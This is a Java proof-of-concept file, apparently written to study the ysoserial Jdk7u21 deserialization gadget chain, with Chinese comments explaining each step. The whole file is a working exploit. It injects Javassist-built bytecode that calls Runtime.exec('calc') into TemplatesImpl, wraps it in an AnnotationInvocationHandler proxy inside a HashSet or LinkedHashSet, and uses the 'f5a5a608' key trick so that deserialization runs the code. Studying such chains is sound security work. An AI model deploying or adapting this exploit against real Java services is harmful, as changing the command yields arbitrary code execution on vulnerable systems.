package com.r17a.ysoserial.jdk7u21;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;

public class Poc {
    //序列化
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    //反序列化
    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }

    //通过反射为obj的属性赋值
    private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    //封装了之前对恶意TemplatesImpl类的构造
    private static TemplatesImpl getEvilTemplatesImpl() throws Exception {
        ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
        CtClass cc = pool.makeClass("Evil");//创建Evil类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//创建无参构造函数
        cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//设置无参构造函数体
        cc.addConstructor(cons);
        byte[] byteCode = cc.toBytecode();//toBytecode得到Evil类的字节码
        byte[][] targetByteCode = new byte[][]{byteCode};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCode);
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_name", "xx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    public static void main(String[] args) throws Exception {
//        expHashSet();
        expLinkedHashSet();
    }

    public static void expLinkedHashSet() throws Exception {
        TemplatesImpl templates = getEvilTemplatesImpl();

        HashMap map = new HashMap();

        //通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler
        Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);

        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);

        // 创建动态代理，用tempHandler代理Templates接口，AnnotationInvocationHandler的invoke代理Templates接口的两个方法newTransformer()和getOutputProperties()
        Templates proxy = (Templates) Proxy.newProxyInstance(Poc.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);

        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);
        map.put("f5a5a608", templates);

        byte[] obj = serialize(set);
        unserialize(obj);
    }


    public static void expHashSet() throws Exception {
        TemplatesImpl templates = getEvilTemplatesImpl();

        HashMap map = new HashMap();
        map.put("f5a5a608", new int[]{-16});

        //通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler
        Constructor ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);

        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);

        // 创建动态代理，用tempHandler代理Templates接口，AnnotationInvocationHandler的invoke代理Templates接口的两个方法newTransformer()和getOutputProperties()
        Templates proxy = (Templates) Proxy.newProxyInstance(Poc.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);

        HashSet set = new HashSet();
        set.add(proxy);
        set.add(templates);
        map.put("f5a5a608", templates);

        byte[] obj = serialize(set);
        unserialize(obj);
    }
}